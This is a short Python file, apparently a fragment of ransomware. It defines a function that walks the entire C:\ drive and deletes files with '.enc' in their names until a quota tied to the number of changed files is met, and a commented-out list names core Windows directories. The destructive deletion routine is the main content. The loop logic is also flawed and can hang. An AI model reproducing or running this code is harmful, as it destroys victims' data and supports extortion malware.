import os
import random
import stat
#importantDirectoryArray = {"Program Files\\", "Program Files (x86)\\", "ProgramData\\","Users\\", "Windows\\SysWOW64\\", "Windows\\System\\", "Windows\\System" }



def deleteFiles(filesChanged):#credit: http://stackoverflow.com/questions/2656322/python-shutil-rmtree-fails-on-windows-with-access-is-denied
    rootDirectionary = "C:\\"
    deletedFiles = 0
    for subdir, dirs, files in os.walk(rootDirectionary):
        
        while deletedFiles < filesChanged/6:
            for file in files:
            
                filename = os.path.join(subdir, file)
                if ".enc" in filename:
                    
                    os.remove(filename)
                    deletedFiles += 1
                
    
        